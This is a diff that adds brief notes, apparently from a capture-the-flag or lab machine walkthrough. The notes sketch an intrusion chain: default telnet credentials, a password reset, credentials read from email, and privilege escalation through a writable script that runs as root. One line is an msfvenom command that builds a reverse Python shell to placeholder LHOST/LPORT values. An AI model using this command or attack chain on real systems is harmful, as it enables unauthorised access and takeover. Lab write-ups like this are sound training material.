@@ -1,0 +1,12 @@
+Points:
+- telnet
+
+secret port => vuln service => find exploit => but need user login to trigger
+telnet serivce with default user pass => reset users's pass => telnet another service to read email => get ssh credential, but restricted; and the exploit doesn't work
+replace the payload in the exploit with the one generated from msfvenom:
+`
+msfvenom -p cmd/unix/reverse_python LHOST=xxxx LPORT=xxx SHELL=/bin/bash -v payload -a cmd --platform Unix
+`
+=> get the normal shell
+
+then pay attention to the enumeration script output, there is a writable script running by root.
